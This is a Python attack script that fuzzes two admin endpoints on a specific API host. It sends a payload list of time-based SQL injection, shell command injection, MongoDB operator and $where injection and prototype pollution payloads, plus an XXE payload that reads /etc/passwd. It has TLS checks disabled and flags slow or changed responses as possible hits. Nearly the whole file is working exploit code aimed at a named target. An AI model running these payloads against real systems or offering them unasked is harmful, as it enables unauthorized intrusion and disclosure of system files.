import requests
import time
import json

target = "https://api.ffbbbdc6d3c353211fe2ba39c9f744cd.com/p/admin"
# Also try /p/back
targets = [target, "https://api.ffbbbdc6d3c353211fe2ba39c9f744cd.com/p/back"]

payloads = [
    # SQLi Time-based
    {"id": "1' WAITFOR DELAY '0:0:5'--"},
    {"id": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"},
    {"id": "1' AND SLEEP(5)--"},
    {"id": "1; SELECT PG_SLEEP(5)"},
    
    # Command Injection
    {"cmd": "; sleep 5;"},
    {"cmd": "| sleep 5"},
    {"cmd": "`sleep 5`"},
    {"cmd": "$(sleep 5)"},
    
    # NoSQL Injection (MongoDB)
    {"username": {"$ne": None}, "password": {"$ne": None}},
    {"$where": "sleep(5000)"},
    {"id": {"$where": "sleep(5000)"}},
    
    # JSON Injection / Prototype Pollution
    {"__proto__": {"test": "polluted"}},
    {"constructor": {"prototype": {"test": "polluted"}}}
]

headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}

xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>"""

print(f"Starting Time-Based Fuzzing on {targets}...")

for url in targets:
    print(f"\nTarget: {url}")
    
    # XXE Check
    try:
        print("Checking XXE...")
        r = requests.post(url, data=xxe_payload, headers={"Content-Type": "application/xml"}, verify=False, timeout=5)
        if "root:" in r.text:
             print(f"[!!!] XXE VULNERABILITY FOUND: {r.text[:100]}")
    except: pass

    # Baseline
    start = time.time()
    try:
        requests.post(url, json={"test": 1}, verify=False, timeout=5)
        baseline_time = time.time() - start
        print(f"Baseline time: {baseline_time:.4f}s")
    except:
        print("Baseline failed")
        continue

    for p in payloads:
        try:
            start = time.time()
            r = requests.post(url, json=p, verify=False, timeout=10)
            duration = time.time() - start
            
            # If duration is significantly longer than baseline (> 3s)
            if duration > max(3, baseline_time + 2):
                print(f"[!!!] POSSIBLE TIME DELAY: {json.dumps(p)} took {duration:.4f}s")
            
            # Check for status change
            if r.status_code != 500:
                print(f"[!] STATUS CHANGE: {json.dumps(p)} -> {r.status_code}")
                
        except requests.Timeout:
            print(f"[!!!] TIMEOUT (Possible success): {json.dumps(p)}")
        except Exception as e:
            pass
